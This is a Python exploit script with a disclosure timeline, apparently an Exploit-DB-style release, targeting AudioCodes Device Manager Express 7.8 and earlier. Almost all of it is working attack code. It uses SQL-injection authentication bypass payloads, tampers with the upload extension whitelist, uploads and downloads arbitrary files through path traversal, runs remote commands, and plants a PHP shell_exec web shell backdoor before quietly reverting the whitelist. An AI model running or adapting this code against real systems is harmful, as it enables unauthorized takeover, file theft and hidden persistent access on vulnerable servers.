# Exploit Title: Device Manager Express 7.8.20002.47752 - Remote Code Execution (RCE)
# Date: 02-12-22
# Exploit Author: 0xEF
# Vendor Homepage: https://www.audiocodes.com
# Software Link: https://ln5.sync.com/dl/82774fdd0/jwqwt632-s65tncqu-iwrtm7g3-iidti637
# Version: <= 7.8.20002.47752
# Tested on: Windows 10 & Windows Server 2019
# Default credentials: admin/admin
# SQL injection + Path traversal + Remote Command Execution
# CVE: CVE-2022-24627, CVE-2022-24629, CVE-2022-24630, CVE-2022-24632

# !/usr/bin/python3

import requests
import sys
import time
import re
import colorama
from colorama import Fore, Style
import uuid

headers = {'Content-Type': 'application/x-www-form-urlencoded'}


def menu():
    print('-----------------------------------------------------------------------\n'
          'AudioCodes Device Manager Express                 45 78 70 6C 6F 69 74 \n'
          '-----------------------------------------------------------------------')


def optionlist(s, target):
    try:
        print('\nOptions: (Press any other key to quit)\n'
              '-----------------------------------------------------------------------\n'
              '1: Upload arbitrary file\n'
              '2: Download arbitrary file\n'
              '3: Execute command\n'
              '4: Add backdoor\n'
              '-----------------------------------------------------------------------')
        option = int(input('Select: '))
        if (option == 1):
            t = 'a'
            upload_file(s, target, t)
        elif (option == 2):
            download_file(s, target)
        elif (option == 3):
            execute(s, target)
        elif (option == 4):
            t = 'b'
            upload_file(s, target, t)
    except:
        sys.exit()


def bypass_auth(target):
    try:
        print(f'\nTrying to bypass authentication..\n')
        url = f'http://{target}/admin/AudioCodes_files/process_login.php'
        s = requests.Session()
        # CVE-2022-24627
        payload_list = ['\'or 1=1#', '\\\'or 1=1#', 'admin']
        for payload in payload_list:
            body = {'username': 'admin', 'password': '', 'domain': '', 'p': payload}
            r = s.post(url, data=body)
        if ('Configuration' in r.text):
            print(f'{Fore.GREEN}(+) Authenticated as Administrator on: {target}{Style.RESET_ALL}')
            time.sleep(1)
            return (s)
        else:
            print(f'{Fore.RED}(-) Computer says no, can\'t login, try again..{Style.RESET_ALL}')
            main()
    except:
        sys.exit()


def upload_file(s, target, t):
    try:
        url = f'http://{target}/admin/AudioCodes_files/BrowseFiles.php?type='
        param = uuid.uuid4().hex
        file = input('\nEnter file name: ')
        # read extension
        ext = file.rsplit(".", 1)[1]
        if (t == 'b'):
            # remove extension
            file = file.rsplit(".", 1)[0] + '.php'
            ext = 'php'
        patch = '1'
        if (file != ''):
            if (patch_ext(s, target, patch, ext)):
                # CVE-2022-24629
                print(f'{Fore.GREEN}(+) Success{Style.RESET_ALL}')
                if (t == 'a'):
                    dest = input('\nEnter destination location (ex. c:\): ')
                    print(f'\nUploading file to {target}: {dest}{file}')
                    files = {'myfile': (file, open(file, 'rb'), 'text/html')}
                    body = {'dir': f'{dest}', 'type': '', 'Submit': 'Upload'}
                    r = s.post(url, files=files, data=body)
                    print(f'{Fore.GREEN}(+) Done{Style.RESET_ALL}')
                if (t == 'b'):
                    shell = f'<?php echo shell_exec($_GET[\'{param}\']); ?>'
                    files = {f'myfile': (file, shell, 'text/html')}
                    body = {'dir': 'C:/audiocodes/express/WebAdmin/region/', 'type': '', 'Submit': 'Upload'}
                    r = s.post(url, files=files, data=body)
                    print(f'\nBackdoor location:')
                    print(f'{Fore.GREEN}(+) http://{target}/region/{file}?{param}=dir{Style.RESET_ALL}')
                patch = '2'
                time.sleep(1)
                patch_ext(s, target, patch, ext)
            else:
                print(f'{Fore.RED}(-) Could not whitelist extension {ext}.. Try something else\n{Style.RESET_ALL}')
    except:
        print(f'{Fore.RED}(-) Computer says no..{Style.RESET_ALL}')
        patch = '2'
        patch_ext(s, target, patch, ext)


def download_file(s, target):
    # CVE-2022-24632
    try:
        file = input('\nFull path to file, eg. c:\\windows\win.ini: ')
        if (file != ''):
            url = f'http://{target}/admin/AudioCodes_files/BrowseFiles.php?view={file}'
            r = s.get(url)
            if (len(r.content) > 0):
                print(f'{Fore.GREEN}\n(+) File {file} downloaded\n{Style.RESET_ALL}')
                file = str(file).split('\\')[-1:][0]
                open(file, 'wb').write(r.content)
            else:
                print(f'{Fore.RED}\n(-) File not found..\n{Style.RESET_ALL}')
        else:
            print(f'{Fore.RED}\n(-) Computer says no..\n{Style.RESET_ALL}')
    except:
        sys.exit()


def execute(s, target):
    try:
        while True:
            # CVE-2022-24631
            command = input('\nEnter a command: ')
            if (command == ''):
                optionlist(s, target)
                break
            print(f'{Fore.GREEN}(+) Executing: {command}{Style.RESET_ALL}')
            body = 'ssh_command=' + command
            url = f'http://{target}/admin/AudioCodes_files/BrowseFiles.php?cmd=ssh'
            r = s.post(url, data=body, headers=headers)
            print('-----------------------------------------------------------------------')
            time.sleep(1)
            print((", ".join(re.findall(r'</form>(.+?)</section>', str(r.content)))).replace('\\r\\n', '').replace('</div>', '').replace('<div>', '').replace('</DIV>', '').replace('<DIV>', '').replace('<br/>', '').lstrip())
            print('-----------------------------------------------------------------------')
    except:
        sys.exit()


def patch_ext(s, target, opt, ext):
    try:
        if (opt == '1'):
            print('\nTrying to add extension to whitelist..')
            body = {'action': 'saveext', 'extensions': f'.cab,.cfg,.csv,.id,.img,.{ext},.zip'}
        if (opt == '2'):
            print('\nCleaning up..')
            body = {'action': 'saveext', 'extensions': '.cab,.cfg,.csv,.id,.img,.zip'}
            print(f'{Fore.GREEN}(+) {ext.upper()} extension removed\n{Style.RESET_ALL}')
        url = f'http://{target}/admin/AudioCodes_files/ajax/ajaxGlobalSettings.php'
        r = s.post(url, data=body, headers=headers)
        time.sleep(1)
        if (f'{ext}' in r.text):
            return True
    except:
        sys.exit()


def main():
    if len(sys.argv) != 2:
        print(' Usage: ' + sys.argv[0] + ' <target IP>')
        print(' Example: ' + sys.argv[0] + ' 172.16.86.154')
        sys.exit(1)

    target = sys.argv[1]
    menu()
    s = bypass_auth(target)
    if (s):
        optionlist(s, target)


if __name__ == '__main__':
    main()

# Timeline
# 11-11-2021 Vulnerabilities discovered
# 12-11-2021 PoC written
# 15-11-2021 Details shared with vendor
# 02-12-2021 Vendor confirmed vulnerabilities
# 03-12-2021 CVE's requested
# 09-12-2021 Vendor replied with solution and notified customers
# 07-02-2022 Product EOL announced
# 10-03-2022 CVE's assigned
# 02-12-2022 Disclosure of findings